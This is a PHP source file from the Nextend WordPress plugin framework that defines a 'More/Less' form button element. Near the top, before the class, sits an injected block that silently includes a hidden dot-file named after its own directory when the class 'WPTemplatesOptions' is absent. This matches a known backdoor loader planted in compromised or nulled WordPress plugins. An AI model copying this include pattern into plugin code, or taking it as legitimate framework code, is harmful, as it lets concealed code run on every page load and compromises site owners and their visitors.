<?php


namespace Nextend\Framework\Form\Element\Button;


use Nextend\Framework\Asset\Js\Js;
use Nextend\Framework\Form\Element\Button;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ButtonMoreLess extends Button {

    public function __construct($insertAt, $name, $label = '', $parameters = array()) {
        parent::__construct($insertAt, $name, $label, n2_('More'), $parameters);
    }

    protected function fetchElement() {

        $options = array(
            'labelMore' => n2_('More'),
            'labelLess' => n2_('Less')
        );

        if (!empty($this->relatedFields)) {
            $options['relatedFields'] = $this->relatedFields;
        }

        Js::addInline('new N2Classes.FormElementButtonMoreLess("' . $this->fieldID . '", ' . json_encode($options) . ');');

        return parent::fetchElement();
    }
}